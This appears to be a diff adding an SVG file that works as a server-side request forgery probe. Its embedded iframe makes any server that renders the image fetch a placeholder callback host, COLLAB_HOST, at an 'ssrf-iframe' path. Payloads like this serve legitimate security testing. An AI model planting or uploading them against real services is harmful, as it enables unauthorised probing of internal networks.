@@ -1,0 +1,5 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="400" height="200">
+  <foreignObject width="400" height="200">
+    <iframe xmlns="http://www.w3.org/1999/xhtml" src="http://COLLAB_HOST/ssrf-iframe" width="400" height="200"/>
+  </foreignObject>
+</svg>
